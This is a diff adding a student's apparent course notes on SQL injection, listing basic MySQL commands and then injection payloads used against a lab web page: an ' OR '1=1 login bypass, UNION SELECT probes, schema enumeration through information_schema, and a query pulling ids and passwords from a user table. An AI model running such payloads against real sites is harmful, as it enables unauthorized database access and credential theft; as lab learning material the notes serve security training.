@@ -303,9 +303,43 @@ file traversal
 
 
 
+DAY 3 SQL INJECTION
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+mysql
+-starts sql
 
+show databases;
+-show data
 
+show tables from session;
+-show specific table from database
+
+select * from session.Tires;
+-select everything from a session
+
+select tireid,name,cost from seesion.Tires;
+-shows specific columns from session
+
+use session;
+-go into session
+  select * from Tires;
+  
+
+-character entries are in quotes by default and can be broken by adding your own quotes
+
+User' OR '1=1
+
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3
+-find feilds available abd what order they display
+
+Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
+
+User guide .columns in reasouce
+
+Selection=2 UNION select name,type,cost from session.car;#
+
+Selection=2 UNION select id,pass,name from session.user;#
 
 
 
